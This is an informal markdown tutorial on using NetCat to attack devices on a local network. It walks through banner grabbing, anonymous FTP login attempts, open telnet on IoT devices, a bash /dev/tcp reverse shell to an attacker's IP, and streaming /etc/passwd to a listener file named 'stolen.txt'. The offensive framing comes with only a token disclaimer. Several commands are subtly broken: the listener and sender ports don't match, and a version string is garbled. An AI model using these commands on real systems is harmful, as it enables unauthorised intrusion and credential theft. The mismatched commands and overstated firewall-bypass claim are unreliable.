# NetCat (nc)
So.... You are on a network, whether its public or private. You just Nmap'd through to see if there was anything interesting and looking for the next step into poking around. Nmap is a great recon tool, but it just isnt scratching that spot that you want. 

"What's that scratch?' You may be asking yourself. Well, it's NetCat. This is made for raw networking utility that lets you manually connect to ports, send data, and see how services respond. This system will let you look for IoT devices and see what they are doing on the network. 

NetCat is primarily looking for what is on the network, and expanding the attack surface. What is on, what is vulnerable and what is going to cause a headache later.

# What Now?
We have the knowledge from Nmap and we need to expand the surface of whats on the ports.

## 1) Manual Banner Grabbing on the LAN
Nmap guesses the service version. Netcat lets you see if for yourself, directly from the source.
We will be connecting to a device on the LAN and grab the service banner from it. 

### WTF is a Service Banner?
This is what holds all the information for the IoT device related to the following.
* Software Name
* Version Number
* Operating System
*It is the MetaData of the device. From here you look for vulnerabilities, or outdated devices that can be tagged into*

***This commands are for connecting to a NAS device on the local network (We will use IPv4 - 192.168.1.1)***
For this scan, we have the IP and the port will be ***80***
*This will also scan for Network Printer's Web Interface*
```
nc -vn 192.168.1.1 80
```
***Lets connect to a computer's FTP service with port 21***
```
nc -vn 192.168.1.1 21
```

### WTF Am I Reading?
1) NetCat connects to the target's IP and port
2) The Service will often respond with its exact name and version.
3) You are now in an interactive session. For the web server, type GET / HTTP/1.0 and press *ENTER* twice (x2). For FTP, try typing *HELP* to view other commands.

***It will look something like this***
```
$ nc -vn 192.168.1.1 80
Connection to 192.168.1.1 80 port [tcp/*] succeeded!
GET / HTTP/1.0

HTTP/1.0 200 OK
Server: lighttpd/1.d.55
...
```
You've now confirmed the NAS is running a specific, potentially old, version of lighttpd. 

## 2) Test for Anonymous Login on Local Shares
This is the fun finds. Looking for common misconfigurations on home and small office networks is an open or anaonymous network share

Lets connect to these SMB or FTP share misconfigurations on the LAN to see if it allows access without credentials

### WTF is an SMB and FTP?
1) SMB (Server Message Block)
   * Look at remote files like they are on your own computer
   * These are like the C: drive for Windows systems
   * Supports file locking, which means it prevents two people from viewing the same file at once.
   * Native to Microsoft and IBM for all Windows networking. For Linux, its Samba.
   * Considered "chatty," meaning it sends many small messages back and forth. This makes it very fast on local networks but often slow over the internet.
2) FTP (File Transper Protocol)
   * It works like a postal service. You "get" (download) a file or "put" (upload) a file. You don't get to edit the file directly on the server; you download it, edit locally, and upload it back. *Or leave a note that the computer is not secure*
   * Uses two separate "channels" - one for comands and the other for actual data.
   * Native across all operating systems without special software, like Samba.
   * Standard FTP is unencrypted, meaning your password and files are sent in plain text. Most modern users use SFTP (Secure FTP) instead.
  
**Primary Use**
SMB - Local network resource sharing
FTP - internet file transfers

**Can Share**
SMB - Files, Printers, Serial Ports
FTP - Files Only

**Best For**
SMB - Editing files in place (Collaboration)
FTP - Large Bulk file transfers

**Speed**
SMB - Fast on LAN; slow on internet
FTP - Fast even on high-latency networks

### Commands
Connect to a Windows PC's SMB port
```
nc -vn 192.168.1.1 445
```

Lets connect to a local FTP server
```
nc -vn 192.168.1.1 21
```

### WTF is Happening?
For the FTP, you can manually try to log in:
After connecting, use the following commands in an attempt to bypass
```
USER anonymous
PASS guest@local
LIST
QUIT
```
If the *LIST* command returns a directory of files, you've found an open share. 
For SMB, the connection itself might reveal information. but you'd have to use smbclient to interact further. This Netcat test confrims the port is open and responsive.

## 3) Probing "Headless" Devices (IoT Embedded Systems)
Many IoT devices (smart TVs, cameras, thermostats) have web servers or telnet ports that are poorly secured. 

***Nightmare Fuel***
Connecting to these devices is the where all those fear videos come from. Roombas yelling slurs at animals. Stalkers talking through Cameras.

### Commands
Connect to a smart TV's telnet port (if open)
```
nc -vn 192.168.1.1 23
```

Connect to an IP camera's web interface
```
nc -vn 192.168.1.1 80
```

### WTF Am I Looking At?

Telnet services on IoT devices sometimes have no password at all, or use default ones like *admin/admin* or *root/root*. If you connect to a telnet port and get a *login:* or *#* prompt without any authentication, you have **full** control of the device. This is critical vulnerability to find on a local network.

## 4) Spawning a Reverse Shell on a Local Compromised Machine
This is the most intrusive you could get with Netcat. If you have anyway to execute a command on a target machine on the LAN (i.e. through a vulnerable web application you find), you can use Netcat to get full command-line shell.

***WARNING: THIS IS A DIRECT ATTACK ON A SYSTEM. THIS IS FOR EDUCATION PURPOSE ONLY***

### Commands
Lets establish a reverse shell from a target on the LAN back to your machine.

**1) We need to 1st start the listener (Your Machine)**
```
nc -lvp 4444
```
**-l**: Listen Mode
**-p 444**: Listen on port 4444 (any unused port will do)
**-v**: Verbose

This terminal will not sit and waiy for the connection

**2) On the target machine**
We need to set up the shell to connect to the listener

```
/bin/bash -i >& /dev/tcp/192.168.1.100/444 0>&1
```
*This is a bash command to create a TCP connection back to your machine IP. You will have to input your IP that you want the machine to listen to

### WTF Is This?
This is where you can now execute commands on the target, your waiting for the listener terminal to show it connected to your machine. It will show *victim@hostname:-$* when it is connected. From here, you can run it like you would on your machine. 

**Commands like:**
```
ifconfig
ls -la /home
cat /etc/passwd
```
Its really your computer now.

## 5) LAN FIle Exfilitration
Found something interesting you want to keep? Something that scratches that itch, passwords, resources, scripts, really what ever you were like "..... huh? Your coming home with me!" Well, this is how you save it. 

### 1) On your Machine (The receiver now)
Set up a listent to receive the file and save it.
```
nc -lvp 555 > stolen.txt
```
Listen to port 5555 and redirect all incoming data to a file named 'stolen.txt'

### 2) On the target machine (The Sender)
Send the file to your Terminal Listener
```
nc 192.168.1.100 5555 < /etc/passwd
```
Send the /etc/passwd file to your machine at the IP and the port

### What Now?
The file is streamed directly from the target to your machine over the network, completely bypassing firewalls or logging that might be in place for standard file transfer protocols. Once the transfer is complete, your listener will terminate, and you have the file.

## Important LAN-Specific Considerations
* **Speed:** Scans and stransfers on a LAN are extremely fast. Be aware that noisy scans can be detected by simple network monitoring tools if they are in place.
* **Trust:** Devices on a LAN often implicity trust each other. There is not alot of vetting happening when on the same network. This is why techniques like reverse shells are so effective once a single machine is compromised.
* **Variety of Targets:** A LAN has more than just computers. You have phones, TVs, printers, game consoles, smart home gadgets. These are often the weakest links and run outdated software. Test them all. ***Remember: If you don't update the software, review your deprecated or end of life devices, alot of other people don't either.***
* **Physical Access:** If you have physical access, you can plug in directly and bypass all wireless security, making these tests even easier.
